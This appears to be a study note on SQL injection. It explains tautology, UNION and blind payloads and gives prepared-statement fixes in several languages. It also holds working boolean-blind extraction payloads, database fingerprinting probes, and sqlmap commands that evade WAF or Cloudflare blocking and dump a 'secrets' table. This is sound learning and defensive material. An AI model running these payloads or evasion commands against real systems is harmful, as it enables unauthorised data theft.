#webapplications

OWASP A05 (Injection). A normal parameterized-looking query, built unsafely by string concatenation:
```sql
SELECT code, title FROM courses WHERE code = 'CYBR401' AND published = 1;
```

## Changing the query
```
Input: CYBR401' OR 1=1 --
SELECT code, title FROM courses WHERE code = 'CYBR401' OR 1=1 -- ' AND published = 1
```
| Input piece | Effect |
| --- | --- |
| `'` | Closes the string value |
| `OR 1=1` | Makes the condition true for every row |
| `--` | Comments out the rest of the real query (the `AND published = 1` check) |

The normal request returns one row; the injected one returns every row, crossing whatever boundary the `WHERE` clause was supposed to enforce (here: unpublished rows too).

## UNION and blind SQL injection
**UNION** appends compatible result rows from a different table once you know the column count/types:
```sql
NONE' UNION SELECT owner, note FROM private_notes --
```
**Blind SQLi** — when the response never shows query results directly, use a true/false condition and observe the difference in response (content, length, or timing):
```sql
CYBR401' AND 1=1 --   → match
CYBR401' AND 1=2 --   → no match
```
The observation technique changes; the root defect — unsafe query construction — is the same either way.

## Prepared statements — the actual fix
A prepared statement fixes the query's *structure* first; input is bound afterward as a value, so it's never parsed as SQL, no matter what characters it contains:
```python
# unsafe — input becomes part of the SQL source
sql = "SELECT code, title FROM courses WHERE code = '" + code + "' AND published = 1"
rows = db.execute(sql).fetchall()

# prepared — input stays a value
sql = "SELECT code, title FROM courses WHERE code = ? AND published = 1"
rows = db.execute(sql, (code,)).fetchall()
```
Same idea in other drivers:
```java
// Java (JDBC)
ps = conn.prepareStatement("SELECT title FROM courses WHERE code = ?");
ps.setString(1, code);
```
```php
// PHP (PDO)
$st = $pdo->prepare("SELECT title FROM courses WHERE code = :code");
$st->execute(['code' => $code]);
```
```js
// Node.js (pg)
client.query("SELECT title FROM courses WHERE code = $1", [code]);
```

## Where placeholders don't reach
| Case | Defense |
| --- | --- |
| Table/column names, sort direction | Map the input to a fixed allowlist, never interpolate an identifier |
| SQL built inside a stored procedure or an ORM "raw query" escape hatch | Bind values there too — the placeholder protection doesn't follow you automatically |
| Database error text | Generic message to the user, real detail only in server logs |
| What a successful injection could still do | Least-privilege database account — the app's DB user shouldn't be able to read tables it has no reason to touch |

```python
# identifier example — never do this
sql = "SELECT code, title FROM courses ORDER BY " + sort   # unsafe even with no quotes involved
# map it instead
columns = {"code": "code", "title": "title"}
sort = columns.get(param, "code")
```

## Blind SQL injection — boolean-based
When results never display directly, ask yes/no questions. A single boolean response is enough to extract everything because you control what the bit answers.

### Confirmation workflow
Find a payload pair that flips the output on pure logic:
```
Normal:  /available?name=alice             → {"exists":true}
True:    /available?name=alice' AND 1=1-- -  → {"exists":true}
False:   /available?name=alice' AND 1=2-- -  → {"exists":false}
```
If those two differ, injection is confirmed — you now know TRUE vs FALSE. **Use `AND` with a real row, not `OR`** — `alice' OR ...` is always true (alice exists), which is useless. `alice' AND (your condition)` makes the response mirror your logic.

### Fingerprint the database engine
One probe decides the function set:
```
SQLite:       alice' AND unicode(substr('A',1,1))=65-- -  → true
MySQL/Postgres: alice' AND ascii(substring('A',1,1))=65-- -  → true
MSSQL:        alice' AND ascii(substring('A',1,1))=65-- -  → true
```
This matters because `SUBSTRING` doesn't exist in SQLite (use `substr`), and `information_schema` is MySQL/Postgres/MSSQL (use `sqlite_master` for SQLite).

### Extract via binary search
Ask about each character's ASCII value — ~7 requests per character vs 100 brute:
```
alice' AND unicode(substr((SELECT flag FROM secrets LIMIT 1),1,1))>77-- -
```
Repeat for position 2, 3, etc. with binary search on the value (>77? >103? etc.) until you narrow it to the exact byte.

### Common gotchas
| Gotcha | Symptom | Fix |
| --- | --- | --- |
| Unbalanced parens | `WHERE name='admin'))` has extra `)` → query errors → false response | Confirm FALSE means "condition false," not "query broke" — test with `1=1` and `1=2` first |
| Wrong function for engine | `ASCII()` in SQLite → doesn't exist → everything returns false | Fingerprint first, use right function: `substr`/`unicode` for SQLite, `substring`/`ascii` for MySQL/Postgres |
| Concatenation syntax | `CONCAT(a,b)` in SQLite → doesn't exist | Use `||`: `SELECT flag \|\| '' FROM secrets LIMIT 1` |
| Query context | Injection in a numeric field breaks differently than string field | Test both directions (`' AND 1=1` vs `1 OR 1=1`) to find which syntax fits |

## Testing — direct and blind
- **Reflected/error-based:** `'`, `"`, `1=1`, `OR 1=1`, comment sequences (`--`, `#`, `/* */`) in every text/numeric input, especially IDs and search fields
- **A 500 error or response-shape change** (more rows, different content) is a signal → confirm with a live blind-injection pair (`1=1` vs `1=2`) before escalating to `sqlmap`
- **Blind SQL injection:** any input that affects a boolean response (login success/fail, item exists/not, permission granted/denied) can be extracted via yes/no questions

## sqlmap — when and how
Start with manual confirmation (the pairs above) so you understand what's happening. Once confirmed:

```bash
# Naive first attempt — usually gets blocked
sqlmap -u 'http://target/available?name=alice*' --dbs

# If you hit 403/rate limiting from Cloudflare or WAF:
sqlmap -u '...' --random-agent --delay=1 --threads=1

# If still blocked, use tamper:
sqlmap -u '...' --tamper=space2comment --random-agent

# Specify the TRUE marker so sqlmap compares correctly:
sqlmap -u '...' --string='"exists":true'

# Once injectable is confirmed, find interesting data:
sqlmap -u '...' --tables                    # what tables exist?
sqlmap -u '...' -T secrets --columns        # what columns in secrets?
sqlmap -u '...' -T secrets --dump           # extract all rows
```

**Gotchas:**
- Don't force `--prefix/--suffix` blindly — leads to double-values and breaks detection. Let sqlmap discover context first.
- A wrong `--string` marker makes it declare "not injectable" even when it is. Use the exact TRUE response.
- On SQLite, `--columns` pulls `CREATE TABLE` text char-by-char — that's reading schema, not writing data. Safe to run.
- If 403s come from Cloudflare (check `server: cloudflare` header with `curl -i`), the app is open — sqlmap's traffic signature is the problem, not auth. Prove with plain curl first.

## See also
- [[NoSQL Injection]] for the same class of bug against document databases
- [[sqlmap]] — tool guide for automated detection and exploitation (use after manual confirmation)

